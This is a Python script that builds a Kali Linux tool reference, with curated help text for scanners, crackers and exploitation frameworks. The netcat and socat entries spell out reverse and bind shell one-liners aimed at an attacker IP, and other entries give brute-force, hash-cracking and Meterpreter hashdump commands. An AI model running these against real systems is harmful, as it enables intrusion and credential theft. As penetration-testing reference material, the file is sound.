#!/usr/bin/env python3
"""
Man page & Linux/Kali tool documentation sync script.
Pulls man pages or tool help (--help / -h) for installed Linux/Kali tools,
and generates clean reference docs in knowledge_base_kali/raw/<toolname>.txt.
Includes comprehensive curated fallback documentation for tools not installed locally.
"""

import os
import sys
import shutil
import subprocess

CURATED_TOOLS = [
    # ─── Network & Scanning ───
    "nmap", "masscan", "wireshark", "tshark", "tcpdump",
    "netcat", "nc", "ncat", "socat",
    # ─── DNS & Recon ───
    "dig", "traceroute", "ping", "whois", "dnsrecon", "host",
    "amass", "subfinder", "sublist3r",
    # ─── Web Application & Proxies ───
    "burpsuite", "burp", "zap", "nikto", "gobuster", "dirb", "ffuf", "wpscan", "whatweb", "wfuzz",
    # ─── Exploitation & Vuln ───
    "sqlmap", "metasploit", "msfconsole", "searchsploit", "hydra", "nuclei", "nessus",
    # ─── Password & Hash ───
    "john", "hashcat",
    # ─── Reverse Engineering & Binary ───
    "ghidra", "radare2", "gdb",
    # ─── Wireless ───
    "aircrack-ng", "airmon-ng", "aireplay-ng", "airodump-ng",
    "airbase-ng", "wash", "reaver", "wifite",
    # ─── Crypto & SSL ───
    "openssl",
    # ─── System Admin ───
    "curl", "iptables", "ssh", "systemctl",
    "chmod", "chown", "grep", "sed", "awk", "find",
    "bash", "python3", "ufw",
    # ─── Process & System ───
    "lsof", "ss", "ip", "strace", "ltrace",
    "journalctl", "dmesg", "nmcli",
    # ─── Container & Session ───
    "docker", "tmux", "screen",
    # ─── Forensics ───
    "binwalk", "foremost", "steghide", "strings", "xxd", "file",
]

FALLBACK_TOOL_DOCS = {
    "nmap": """Nmap ("Network Mapper") is an open source tool for network exploration and security auditing.
Common command options:
-sS: TCP SYN stealth scan (default unprivileged root scan).
-sT: TCP connect scan (full handshake).
-sU: UDP scan.
-sV: Version detection (interrogates open ports to determine service/version info).
-sC: Run default NSE scripts.
-O: Enable OS detection.
-A: Enable OS detection, version detection, script scanning, and traceroute.
-p <port ranges>: Scan specified ports (e.g. -p 22,80,443 or -p 1-65535 or -p-).
-T0 to -T5: Set timing template (higher is faster, T4 recommended for fast networks).
-Pn: Treat all hosts as online — skip host discovery.
--top-ports <n>: Scan top n most common ports.
-oN <file>: Output scan results in normal format to specified file.
-oX <file>: Output scan results in XML format.
-oG <file>: Output results in grepable format.
--script <name>: Run specific NSE script (e.g. --script vuln).
Example: nmap -sV -sC -p 22,80,443 -T4 192.168.1.1
Example: nmap -sU --top-ports 100 -T4 10.0.0.0/24
Example: nmap -A -Pn --script vuln target.com""",

    "masscan": """Masscan is the fastest Internet port scanner. It can scan the entire Internet in under 5 minutes.
Common command options:
-p <ports>: Specify ports to scan (e.g. -p 80,443 or -p 0-65535).
--rate <pps>: Set packets per second (e.g. --rate 10000).
--banners: Retrieve banners from discovered services.
-oL <file>: Output results in list format.
-oJ <file>: Output results in JSON format.
--exclude <ip>: Exclude IP ranges from scanning.
--adapter-ip <ip>: Specify source IP address.
Example: masscan 10.0.0.0/8 -p 80,443,8080 --rate 10000
Example: masscan 192.168.1.0/24 -p 0-65535 --rate 1000 --banners""",

    "wireshark": """Wireshark is a network packet analyzer that captures network packets and displays them in detail.
Common capture filters:
host 192.168.1.1: Capture traffic to or from host.
port 80: Capture HTTP traffic.
src host 10.0.0.1: Capture traffic from source host.
net 192.168.0.0/24: Capture traffic from subnet.
Common display filters:
ip.addr == 192.168.1.1: Filter packets involving IP.
http.request.method == "POST": Filter HTTP POST requests.
tcp.flags.syn == 1: Filter TCP SYN packets.
dns: Filter DNS traffic.
tcp.port == 443: Filter HTTPS traffic.
frame.len > 1000: Filter large packets.
!(arp or icmp): Exclude ARP and ICMP.""",

    "tcpdump": """tcpdump is a command-line packet analyzer tool.
Common command options:
-i <interface>: Listen on specified network interface (e.g. -i eth0 or -i any).
-n: Do not convert addresses (host addresses, port numbers) to names.
-v, -vv, -vvv: Increase output verbosity.
-w <file>: Write raw packets to pcap file.
-r <file>: Read packets from pcap file.
-c <count>: Exit after receiving count packets.
-A: Print packet payload in ASCII.
-X: Print packet payload in hex and ASCII.
-s <snaplen>: Set snapshot length (default 262144, use -s 0 for full packet).
Example filters: 'port 80', 'host 10.0.0.1', 'src port 53 and dst host 10.0.0.5'
Example: tcpdump -i eth0 -w capture.pcap port 80
Example: tcpdump -nn -A 'tcp port 443' -c 100""",

    "hydra": """Hydra is a parallelized login cracker which supports numerous protocols to attack.
Common command options:
-l <login>: Single username login.
-L <file>: File containing list of usernames.
-p <password>: Single password.
-P <file>: File containing list of passwords (e.g. rockyou.txt).
-t <tasks>: Number of parallel tasks/threads (default 16).
-v / -V: Verbose / show login attempt per thread.
-s <port>: Set non-standard port.
-f: Exit after first valid credential found.
-o <file>: Write found credentials to file.
Supported protocols: ssh, ftp, http-get, http-post-form, mysql, smb, rdp, telnet, vnc, smtp, pop3, imap.
Example: hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
Example: hydra -L users.txt -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
Example: hydra -l root -P passwords.txt -t 4 -s 2222 ssh://10.0.0.1""",

    "sqlmap": """sqlmap is an open source penetration testing tool that automates detection and exploitation of SQL injection flaws.
Common command options:
-u <URL>: Target URL (e.g. -u "http://example.com/item.php?id=1").
--data <data>: Data string to be sent through POST.
--dbs: Enumerate DBMS databases.
--tables: Enumerate DBMS database tables.
-D <db>: Specify database name.
-T <table>: Specify table name.
-C <columns>: Specify column names.
--dump: Dump DBMS database table entries.
--batch: Never ask for user input, use default behavior.
--risk <1-3>: Risk of tests to perform (default 1).
--level <1-5>: Level of tests to perform (default 1).
--os-shell: Prompt for an interactive operating system shell.
--tamper <script>: Use tamper scripts to bypass WAF.
--forms: Auto-parse and test forms on target URL.
Example: sqlmap -u "http://target.com/page?id=1" --dbs --batch
Example: sqlmap -u "http://target.com/page?id=1" -D dbname --tables --dump""",

    "john": """John the Ripper is a fast password cracker.
Common command options:
--wordlist=<file>: Use wordlist mode with specified wordlist file.
--format=<format>: Specify hash format (e.g. --format=raw-md5, --format=sha512crypt).
--show: Show cracked passwords for specified password file.
--rules: Enable wordlist mutation rules.
--incremental: Use incremental (brute-force) mode.
--single: Use single crack mode.
--fork=<N>: Fork N processes for parallel cracking.
Supported formats: raw-md5, raw-sha1, raw-sha256, bcrypt, sha512crypt, NTLM, and many more.
Example: john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Example: john --format=raw-md5 --show cracked.txt
Example: john --incremental --format=raw-sha256 hashes.txt""",

    "hashcat": """Hashcat is an advanced CPU/GPU-based password recovery utility.
Common command options:
-m <mode>: Hash type (e.g. -m 0 for MD5, -m 1000 for NTLM, -m 1800 for sha512crypt).
-a <mode>: Attack mode (0=Straight, 1=Combination, 3=Brute-force, 6=Hybrid, 7=Hybrid).
-o <file>: Output cracked passwords to file.
--show: Show previously cracked passwords.
-r <file>: Apply rules file.
--force: Ignore warnings and force execution.
-w <N>: Workload profile (1=Low, 2=Default, 3=High, 4=Nightmare).
Example: hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
Example: hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a
Example: hashcat -m 1800 -a 0 shadow.txt wordlist.txt -r rules/best64.rule""",

    "gobuster": """Gobuster is a tool for directory/file, DNS, and vhost brute-forcing.
Common command options:
dir: Directory/file enumeration mode.
dns: DNS subdomain enumeration mode.
vhost: Virtual host enumeration mode.
-u <URL>: Target URL.
-w <wordlist>: Path to wordlist.
-t <threads>: Number of concurrent threads (default 10).
-x <extensions>: File extension to search for (e.g. -x php,html,txt).
-s <status>: Positive status codes (default 200,204,301,302,307,401,403).
-o <file>: Output results to file.
-k: Skip TLS certificate verification.
--no-error: Don't display errors.
Example: gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html
Example: gobuster dns -d target.com -w /usr/share/wordlists/subdomains-top1million-5000.txt""",

    "ffuf": """ffuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go.
Common command options:
-u <URL>: Target URL with FUZZ keyword (e.g. http://target.com/FUZZ).
-w <wordlist>: Wordlist file path.
-H <header>: HTTP header (e.g. -H "Host: FUZZ.target.com").
-X <method>: HTTP method (default GET).
-d <data>: POST data.
-mc <codes>: Match HTTP status codes (e.g. -mc 200,301).
-fc <codes>: Filter HTTP status codes.
-fs <size>: Filter response size.
-t <threads>: Number of concurrent threads.
-o <file>: Output file.
-of <format>: Output format (json, csv, html).
Example: ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200 -t 50
Example: ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt""",

    "dirb": """DIRB is a web content scanner that launches a dictionary-based attack against a web server.
Common command options:
dirb <URL> [wordlist]: Basic scan with optional wordlist.
-o <file>: Save output to disk.
-r: Don't search recursively.
-z <ms>: Add millisecond delay between requests.
-a <agent>: Specify custom User-Agent.
-p <proxy:port>: Use this proxy.
-N <code>: Ignore responses with this HTTP code.
Example: dirb http://target.com /usr/share/wordlists/dirb/common.txt
Example: dirb http://target.com -o results.txt -r""",

    "searchsploit": """SearchSploit is a command-line search tool for Exploit-DB.
Common command options:
searchsploit <term>: Search for exploits matching term.
-w: Show URLs to Exploit-DB rather than local path.
-t: Search just the exploit title.
-e: Examine (open) the exploit.
-m <id>: Copy exploit to current directory.
-p <id>: Show full path to exploit.
--nmap <file.xml>: Search for exploits matching nmap XML output.
Example: searchsploit apache 2.4
Example: searchsploit -w wordpress 5.0
Example: searchsploit --nmap scan_results.xml""",

    "wifite": """Wifite is an automated wireless attack tool.
Common command options:
--all: Attack all targets.
-i <interface>: Wireless interface to use.
--kill: Kill interfering processes.
--wpa: Only attack WPA networks.
--wep: Only attack WEP networks.
--wps: Only attack WPS-enabled networks.
--dict <file>: Wordlist for WPA cracking.
-p <seconds>: Pillage time (seconds to capture).
Example: wifite --kill --wpa --dict /usr/share/wordlists/rockyou.txt
Example: wifite -i wlan0 --all""",

    "lsof": """lsof (List Open Files) lists information about files opened by processes.
Common command options:
-i: List all network connections.
-i :<port>: List processes using specific port.
-u <user>: List files opened by specific user.
-p <PID>: List files opened by specific process ID.
-c <name>: List files opened by command name.
+D <dir>: List opened files under a directory.
-n: Inhibit conversion of network numbers to host names.
-P: Inhibit conversion of port numbers to port names.
Example: lsof -i :80 (find processes using port 80)
Example: lsof -u root -i (root's network connections)
Example: lsof +D /var/log (files open under /var/log)""",

    "ss": """ss (Socket Statistics) is a utility to investigate sockets, replacement for netstat.
Common command options:
-t: Display TCP sockets.
-u: Display UDP sockets.
-l: Display listening sockets.
-a: Display all sockets.
-n: Do not resolve service names.
-p: Show process using socket.
-s: Print summary statistics.
-4: Display only IPv4 sockets.
-6: Display only IPv6 sockets.
state <state>: Filter by socket state (established, listen, etc.).
Example: ss -tulnp (show all listening TCP/UDP with process info)
Example: ss -t state established
Example: ss -i '( dport = :ssh or sport = :ssh )'""",

    "ip": """ip is a powerful networking utility for configuring network interfaces, routing, and tunnels.
Common subcommands:
ip addr: Show/manage IP addresses.
ip link: Show/manage network interfaces.
ip route: Show/manage routing table.
ip neigh: Show/manage ARP table.
ip netns: Show/manage network namespaces.
Common operations:
ip addr show: Display all addresses.
ip addr add <addr>/<mask> dev <iface>: Add IP address.
ip link set <iface> up/down: Enable/disable interface.
ip route add <network> via <gateway>: Add route.
ip neigh show: Show ARP cache.
Example: ip addr show eth0
Example: ip route add 10.0.0.0/8 via 192.168.1.1
Example: ip link set wlan0 down""",

    "strace": """strace is a diagnostic and debugging utility for Linux that traces system calls and signals.
Common command options:
strace <command>: Trace system calls of command.
-p <PID>: Attach to running process.
-e <expr>: Expression to filter syscalls (e.g. -e trace=network, -e trace=file).
-f: Follow forks.
-c: Count time, calls, and errors for each syscall.
-o <file>: Send trace output to file.
-t: Prefix each line with wall clock time.
-T: Show time spent in each syscall.
Example: strace -e trace=open,read,write ls /tmp
Example: strace -p 1234 -f -e trace=network
Example: strace -c -f ./my_program""",

    "binwalk": """Binwalk is a firmware analysis tool for scanning, extracting, and analyzing firmware images.
Common command options:
binwalk <file>: Scan file for embedded files/signatures.
-e: Automatically extract known file types.
-M: Recursively scan extracted files.
-D <type:ext:cmd>: Extract specific file types.
-E: Calculate file entropy.
-B: Only show results for the 'binwalk' signature scan.
--dd: Specify extraction rule.
Example: binwalk firmware.bin (scan for signatures)
Example: binwalk -eM firmware.bin (extract recursively)
Example: binwalk -E firmware.bin (entropy analysis)""",

    "foremost": """Foremost is a file carving tool that recovers files from disk images or raw data.
Common command options:
-i <file>: Input file or device.
-o <dir>: Output directory.
-t <type>: Specify file types to extract (e.g. jpg, png, pdf, doc, zip, all).
-v: Verbose mode.
-q: Quick mode (searches 512-byte boundaries).
-T: Timestamp in output directory name.
Example: foremost -i disk.img -o /output -t jpg,png,pdf
Example: foremost -i /dev/sda1 -o recovered_files -t all""",

    "steghide": """Steghide is a steganography tool that can hide data in image and audio files.
Common command options:
embed: Embed data in a cover file.
extract: Extract data from a stego file.
info: Display information about a stego file.
-cf <file>: Cover file for embedding.
-ef <file>: Embedded file (data to hide).
-sf <file>: Stego file (output or input).
-p <passphrase>: Passphrase for embedding/extracting.
-f: Force overwrite of existing files.
Example: steghide embed -cf image.jpg -ef secret.txt -p mypassword
Example: steghide extract -sf image.jpg -p mypassword
Example: steghide info image.jpg""",

    "docker": """Docker is a platform for developing, shipping, and running containerized applications.
Common command options:
docker run <image>: Create and start a container.
docker ps: List running containers (-a for all).
docker images: List downloaded images.
docker build -t <tag> .: Build image from Dockerfile.
docker exec -it <container> <cmd>: Execute command in running container.
docker stop <container>: Stop a running container.
docker rm <container>: Remove a container.
docker rmi <image>: Remove an image.
docker logs <container>: View container logs.
docker network ls: List Docker networks.
docker volume ls: List Docker volumes.
docker-compose up: Start services defined in docker-compose.yml.
Example: docker run -it --rm kalilinux/kali-rolling /bin/bash
Example: docker exec -it webserver /bin/sh
Example: docker build -t myapp:latest .""",

    "tmux": """tmux is a terminal multiplexer — run multiple terminal sessions inside a single window.
Common command options:
tmux new -s <name>: Create new named session.
tmux attach -t <name>: Attach to existing session.
tmux ls: List sessions.
tmux kill-session -t <name>: Kill a session.
Key bindings (default prefix: Ctrl-b):
Ctrl-b c: Create new window.
Ctrl-b n/p: Next/previous window.
Ctrl-b %: Split pane vertically.
Ctrl-b ": Split pane horizontally.
Ctrl-b o: Switch pane.
Ctrl-b d: Detach from session.
Ctrl-b [: Enter scroll/copy mode.
Example: tmux new -s pentest
Example: tmux attach -t pentest""",

    "nikto": """Nikto is an open source web server scanner that performs comprehensive tests against web servers.
Common command options:
-h <host>: Target hostname or IP.
-p <port>: Target port (default 80).
-ssl: Force SSL mode.
-output <file>: Save output to file.
-Format <fmt>: Output format (csv, htm, txt, xml).
-Tuning <opts>: Scan tuning (1=Files, 2=Misconfig, 3=Info, 4=XSS, etc).
-evasion <technique>: IDS evasion techniques.
-Plugins <name>: Run specific plugins.
-useproxy <proxy>: Use HTTP proxy.
-timeout <secs>: Timeout for requests.
Example: nikto -h http://target.com -p 80,443
Example: nikto -h target.com -ssl -output scan.html -Format htm""",

    "socat": """socat (SOcket CAT) is a multipurpose relay for bidirectional data transfer.
Common usage patterns:
socat - TCP:<host>:<port>: Connect to TCP server.
socat TCP-LISTEN:<port>,fork -: Listen on TCP port.
socat TCP-LISTEN:<port>,reuseaddr,fork EXEC:/bin/bash: Reverse shell listener.
socat FILE:/dev/ttyUSB0,b9600 -: Serial port connection.
socat OPENSSL-LISTEN:<port>,cert=<cert>,key=<key>,fork -: SSL/TLS listener.
socat TCP:<target>:<port> EXEC:'bash -li',pty,stderr,setsid,sigint,sane: Interactive reverse shell.
Example: socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
Example: socat TCP:10.0.0.1:4444 EXEC:'bash -i'""",

    "wpscan": """WPScan is a WordPress security scanner.
Common command options:
--url <URL>: Target WordPress site URL.
--enumerate <type>: Enumerate (u=users, p=plugins, t=themes, vp=vulnerable plugins, vt=vulnerable themes).
--passwords <file>: Password list for brute force.
--usernames <list>: Username list for brute force.
--api-token <token>: WPScan API token for vulnerability data.
--plugins-detection <mode>: Plugin detection mode (passive, aggressive, mixed).
--stealthy: Use stealthy options.
-o <file>: Output to file.
-f <format>: Output format (cli, json, cli-no-color).
Example: wpscan --url http://target.com --enumerate vp,vt,u
Example: wpscan --url http://target.com --passwords rockyou.txt --usernames admin""",

    "journalctl": """journalctl is used to query and display messages from the systemd journal.
Common command options:
journalctl: Show all journal entries.
-u <unit>: Show logs for specific systemd unit.
-f: Follow (tail) the journal.
-b: Show logs from current boot (-b -1 for previous boot).
--since <time>: Show entries since timestamp.
--until <time>: Show entries until timestamp.
-p <priority>: Filter by priority (emerg, alert, crit, err, warning, notice, info, debug).
-n <N>: Show last N entries.
-o <format>: Output format (short, verbose, json, cat).
--no-pager: Do not pipe output to pager.
-k: Show only kernel messages (equivalent to dmesg).
Example: journalctl -u ssh -f (follow SSH logs)
Example: journalctl --since "1 hour ago" -p err
Example: journalctl -b -u nginx --no-pager""",

    "dmesg": """dmesg displays or controls the kernel ring buffer messages.
Common command options:
dmesg: Display all kernel messages.
-T: Show human-readable timestamps.
-H: Human-readable output with pager.
-l <level>: Filter by log level (emerg, alert, crit, err, warn, notice, info, debug).
-f <facility>: Filter by facility (kern, user, daemon, etc.).
-w: Follow (wait for new messages).
--color=always: Force colored output.
-c: Clear the ring buffer after printing.
Example: dmesg -T | tail -50 (recent messages with timestamps)
Example: dmesg -l err,warn -T (only errors and warnings)
Example: dmesg | grep -i usb (USB-related messages)""",

    "burpsuite": """Burp Suite is an integrated platform for security testing of web applications.
It acts as an intercepting proxy between the browser and target web servers to capture, analyze, and manipulate HTTP/HTTPS traffic.
Core Components & Tools:
1. Proxy: Intercepts, inspects, and modifies HTTP/HTTPS requests and responses in transit. Listens by default on 127.0.0.1:8080.
2. Target: Displays site map, target scope definition, and analyzed attack surface.
3. Spider / Crawler: Maps application content, parameters, and functionality automatically.
4. Scanner (Professional): Automated vulnerability scanner detecting SQLi, XSS, CSRF, SSRF, command injection, and security misconfigurations.
5. Repeater: Manual testing tool for replaying, tweaking, and analyzing individual HTTP requests and responses.
6. Intruder: Automated customized attack engine for brute-forcing credentials, fuzzing input parameters, parameter enumeration, and testing rate limits.
   - Attack Types: Sniper (single payload set across multiple positions sequentially), Battering Ram (same payload across all positions simultaneously), Pitchfork (multiple payload sets iterated in parallel), Cluster Bomb (multiple payload sets iterated through all combinations/Cartesian product).
7. Sequencer: Statistical analysis tool to test the randomness and entropy of session tokens, CSRF tokens, and nonce values.
8. Decoder: Converts data between raw formats and encoding schemes (URL, HTML, Base64, Hex, ASCII hex, Hashes like MD5, SHA-256).
9. Comparer: Visual diff tool for comparing HTTP requests, responses, or wordlists.
10. Extender / BApp Store: Extends Burp Suite functionality with custom plugins in Java, Python, and Ruby.
Common Usage: Set browser proxy to 127.0.0.1:8080 and import Burp CA certificate (http://burpsuite) into the browser trust store for HTTPS decryption.""",

    "burp": """Burp Suite (alias 'burp') is the industry standard web application vulnerability testing suite and intercepting HTTP/S proxy.
Key capabilities include intercepting proxying (127.0.0.1:8080), request manipulation in Repeater, automated customized parameter attacks in Intruder, entropy analysis in Sequencer, and automated web vulnerability scanning.
See also: burpsuite.""",

    "metasploit": """Metasploit Framework is a powerful penetration testing platform for developing, testing, and executing exploit code against remote targets.
Core Commands in msfconsole:
search <term>: Search for modules by CVE, name, or platform (e.g. search type:exploit cve:2021).
use <module_path>: Load a specific exploit, auxiliary, post, or payload module (e.g. use exploit/windows/smb/ms17_010_eternalblue).
show options: Display required and optional settings for the active module (RHOSTS, RPORT, LHOST, LPORT).
set <OPTION> <VALUE>: Configure module options (e.g. set RHOSTS 192.168.1.50, set LHOST 10.0.0.5, set LPORT 4444).
set target <id>: Select target architecture/OS version.
set payload <payload_path>: Specify payload to deliver (e.g. set payload windows/x64/meterpreter/reverse_tcp).
check: Verify if the target host is vulnerable without firing the exploit payload.
exploit or run: Execute the module. Use 'exploit -j' to run as background job.
sessions -l: List active Meterpreter or shell sessions.
sessions -i <id>: Interact with a backgrounded session.
Meterpreter commands: sysinfo, getuid, getsystem (privilege escalation), hashdump (dump SAM hashes), screenshot, upload/download, portfwd, route, shell.""",

    "msfconsole": """msfconsole is the primary interactive command-line interface for the Metasploit Framework.
It provides unified management of exploits, payloads, auxiliary scanners, post-exploitation modules, encoders, and listener handlers.
Common workflow: msfconsole -> search <vulnerability> -> use <module> -> set RHOSTS <target> -> set PAYLOAD <payload> -> set LHOST <ip> -> exploit.
See also: metasploit.""",

    "zap": """OWASP ZAP (Zed Attack Proxy) is an open-source web application security scanner and intercepting proxy.
Features:
- Intercepting HTTP/HTTPS proxy for viewing and modifying traffic.
- Automated Active Scanner for detecting OWASP Top 10 vulnerabilities (SQLi, XSS, CSRF).
- Automated Passive Scanner for identifying security headers, cookies, and info disclosures.
- Spider and AJAX Spider for single-page application crawling.
- Fuzzer for parameter testing with custom payloads.
- REST API and CLI automation support for CI/CD DevSecOps pipelines.
Default proxy port: 127.0.0.1:8080 or 8090. CLI execution: zap.sh -cmd -quickurl http://target.com -quickout report.html.""",

    "ghidra": """Ghidra is a software reverse engineering (SRE) suite developed by the NSA.
Capabilities:
- Decompiler for x86, x64, ARM, AArch64, MIPS, PowerPC, and RISC-V architectures.
- Disassembly, function graph analysis, and control flow analysis.
- Scripting in Java and Python (PyGhidra) for automated binary analysis.
- Headless analyzer (analyzeHeadless) for batch command-line binary decompilation.
- Symbolic execution and data type reconstruction.
Example Headless CLI: analyzeHeadless /path/to/project ProjectName -import binary.exe -postScript Decompile.java""",

    "radare2": """radare2 (r2) is an open-source framework for reverse engineering, binary analysis, and disassembly.
Common command options & internal commands:
r2 -d <binary>: Debug binary.
r2 -A <binary>: Open binary and run full analysis ('aaa').
r2 -w <binary>: Open binary in write/patch mode.
Inside r2:
aaa: Analyze all functions, symbols, and cross-references.
afl: List all analyzed functions.
pdf @ <function>: Print disassembly of function (e.g. pdf @ main).
VV @ <function>: Visual graph view of control flow.
px <len> @ <offset>: Print hex dump.
iz: List strings in data sections.
s <address>: Seek to address.""",

    "nuclei": """Nuclei is a fast, template-based vulnerability scanner by ProjectDiscovery.
Common command options:
-u <URL>: Scan a single target URL (e.g. -u https://target.com).
-l <file>: Scan list of targets from file.
-t <path>: Specify template directory or specific YAML template file.
-tags <tags>: Run templates matching specific tags (e.g. -tags cve,rce,ssrf,sqli).
-severity <levels>: Filter templates by severity (info, low, medium, high, critical).
-c <threads>: Concurrency / parallel requests (default 25).
-rate-limit <rps>: Maximum requests per second.
-o <file>: Output findings to file.
-j / -jsonl: Output results in JSON format.
Example: nuclei -u https://target.com -tags cve2023,cve2024 -severity high,critical
Example: nuclei -l targets.txt -t cves/ -o results.txt""",

    "amass": """OWASP Amass performs in-depth network mapping and attack surface reconnaissance using OSINT and active DNS techniques.
Modes & Options:
amass enum -d <domain>: Perform subdomain enumeration.
-active: Perform active DNS resolution and zone transfers.
-passive: Collect data strictly passively without contacting target infrastructure.
-brute: Brute-force subdomain names using wordlists.
-w <wordlist>: Path to subdomain wordlist.
-ip: Display IP addresses for discovered subdomains.
-o <file>: Output results to file.
Example: amass enum -passive -d target.com -o subdomains.txt
Example: amass enum -active -d target.com -brute -w subdomains.txt""",

    "subfinder": """Subfinder is a fast subdomain discovery tool that discovers valid subdomains for websites using passive online sources.
Common command options:
-d <domain>: Target domain to find subdomains for.
-dL <file>: List of domains to scan.
-all: Use all available search engines and sources.
-silent: Output only subdomains (ideal for piping).
-o <file>: Save output to file.
-t <threads>: Number of concurrent goroutines (default 10).
Example: subfinder -d target.com -all -silent | httpx -title -status-code""",

    "sublist3r": """Sublist3r is a Python tool designed to enumerate subdomains of websites using OSINT search engines.
Common command options:
-d <domain>: Target domain name.
-b: Enable subbrute brute force module.
-p <ports>: Scan discovered subdomains for open ports (e.g. -p 80,443,8080).
-v: Verbose output showing subdomains in real time.
-o <file>: Save results to text file.
Example: python sublist3r.py -d target.com -b -o subdomains.txt""",

    "wfuzz": """Wfuzz is a flexible web application brute forcer and parameter fuzzer.
Common command options:
-u <URL>: Target URL with FUZZ keyword (e.g. "http://target.com/FUZZ").
-w <wordlist>: Wordlist file.
-z <type,params>: Payload generator (file, list, range).
--hc <codes>: Hide responses matching HTTP status codes (e.g. --hc 404,403).
--hl <lines>: Hide responses matching line count.
--hw <words>: Hide responses matching word count.
--hh <chars>: Hide responses matching character count.
-H <header>: Custom header (e.g. -H "Cookie: session=FUZZ").
Example: wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ""",

    "nessus": """Nessus is a comprehensive proprietary vulnerability scanner.
It identifies missing patches, software vulnerabilities, malware, misconfigurations, and compliance violations across network hosts, operating systems, and web servers.
Features: Policy-based scanning, credentialed vs uncredentialed scans, CVE correlation, CVSS scoring, and audit compliance plugins. Default web management UI: https://localhost:8834.""",

    "dig": """dig (Domain Information Groper) is a flexible DNS lookup utility.
Common query syntax:
dig <domain>: Perform standard DNS A record lookup.
dig <domain> <TYPE>: Lookup specific record type (A, AAAA, MX, NS, TXT, SOA, CNAME, PTR, ANY).
dig @<server> <domain>: Query specific DNS server (e.g. dig @8.8.8.8 target.com).
dig -x <IP>: Reverse DNS lookup (PTR record).
dig +short <domain>: Print concise, script-friendly result only.
dig +trace <domain>: Trace recursive DNS resolution delegation from root servers.
dig axfr @<server> <domain>: Attempt full DNS zone transfer.
Example: dig target.com MX +short
Example: dig @192.168.1.1 target.com axfr""",

    "whois": """whois is a query and response protocol utility used for querying databases that store registered users of internet resources such as domain names, IP address blocks, and autonomous systems (ASNs).
Common command options:
whois <domain>: Query registrar, creation/expiration dates, name servers, and registrant details.
whois <IP>: Query ARIN/RIPE/APNIC for netblock ownership and ASN information.
whois -h <server> <query>: Query specific WHOIS server.
Example: whois target.com
Example: whois 8.8.8.8""",

    "traceroute": """traceroute tracks the route and transit delays of packets across an IP network.
Common command options:
traceroute <host>: Trace path using UDP probe packets (default on Linux).
-I: Use ICMP ECHO probes instead of UDP.
-T: Use TCP SYN probes (bypasses many firewalls on port 80/443).
-n: Do not resolve IP addresses to domain names (faster output).
-p <port>: Specify destination port.
-m <max_ttl>: Set maximum number of hops (default 30).
Example: traceroute -n -T -p 443 target.com""",

    "dnsrecon": """DNSRecon is a DNS enumeration and scanning script.
Common options:
-d <domain>: Target domain.
-r <range>: Reverse lookup IP range (e.g. -r 192.168.1.0/24).
-D <dictionary>: Subdomain dictionary brute-forcing.
-t <type>: Scan type (std, rvl, brt, srv, axfr, zonewalk).
-a: Perform DNS zone transfer check.
Example: dnsrecon -d target.com -t std,axfr""",

    "whatweb": """WhatWeb recognizes web technologies including content management systems (CMS), blogging platforms, JavaScript libraries, web servers, and embedded devices.
Common command options:
whatweb <URL>: Basic technology fingerprint scan.
-a <1-3>: Aggression level (1=Stealthy, 3=Aggressive).
-v: Verbose output detailing plugins and version matches.
--log-json <file>: Save structured JSON results.
Example: whatweb -a 3 https://target.com -v""",

    "binwalk": """Binwalk is a fast tool for analyzing, reverse engineering, and extracting firmware images and embedded files.
Common command options:
binwalk <file>: Scan binary for known file signatures and magic headers.
-e / --extract: Automatically extract identified file formats and file systems.
-M / --matryoshka: Recursively scan and extract embedded files.
-B / --signature: Perform file signature analysis.
-E / --entropy: Calculate and plot file entropy to detect encrypted or compressed sections.
-r / --rm: Delete carved/extracted archives after extraction.
Example: binwalk -e -M firmware.bin
Example: binwalk -E firmware.bin""",

    "steghide": """steghide is a steganography program that hides data in various image and audio files (JPEG, BMP, WAV, AU).
Common command options:
embed: Embed secret data into cover file.
  -cf <cover_file>: Cover file.
  -ef <secret_file>: Secret file to embed.
  -p <passphrase>: Passphrase.
extract: Extract secret data from stego file.
  -sf <stego_file>: Stego file.
  -xf <output_file>: Extracted file path.
  -p <passphrase>: Passphrase.
info: Display stego file metadata and compression info (steghide info file.jpg).
Example: steghide extract -sf image.jpg -p "password123" """,

    "docker": """Docker is a containerization platform used for running isolated application containers.
Common commands:
docker run -d --name <name> -p <host_port>:<container_port> <image>: Run container in background.
docker ps -a: List all containers (running and stopped).
docker images: List local container images.
docker exec -it <container> /bin/bash: Open interactive shell in running container.
docker logs -f <container>: Tail container log output.
docker stop <container> / docker rm <container>: Stop and remove container.
docker system prune -a: Remove all unused containers, networks, and images.""",

    "tmux": """tmux is a terminal multiplexer for managing multiple persistent terminal sessions.
Key Bindings (Default prefix is Ctrl+b):
Ctrl+b c: Create a new window.
Ctrl+b %: Split current pane vertically.
Ctrl+b ": Split current pane horizontally.
Ctrl+b <arrow>: Switch between panes.
Ctrl+b d: Detach from session.
Ctrl+b [: Enter scrollback / copy mode.
Commands:
tmux new -s <name>: Create named session.
tmux attach -t <name>: Attach to existing session.
tmux ls: List active sessions.
tmux kill-session -t <name>: Destroy session.""",

    "netcat": """Netcat (nc / ncat) is the 'Swiss army knife' networking utility for reading and writing TCP/UDP connections.
Common usage patterns:
Port scanning: nc -zv <host> <start_port>-<end_port> (e.g. nc -zv 192.168.1.1 20-80).
Banner grabbing: echo "" | nc -nv -w 2 <host> <port>.
TCP Port Listener: nc -lvnp <port> (e.g. nc -lvnp 4444).
Reverse Shell (Target connecting to Attacker listener): nc -e /bin/bash <attacker_ip> 4444.
Bind Shell: nc -lvnp 4444 -e /bin/bash.
File Transfer: Listener: nc -lvnp 1234 > output.file | Sender: nc <target_ip> 1234 < input.file.""",

    "nc": """nc (Netcat) is a versatile networking utility for reading, writing, listening, and redirecting network streams over TCP/UDP.
See also: netcat.""",

    "ncat": """ncat is Nmap's modern, feature-rich reimplementation of Netcat.
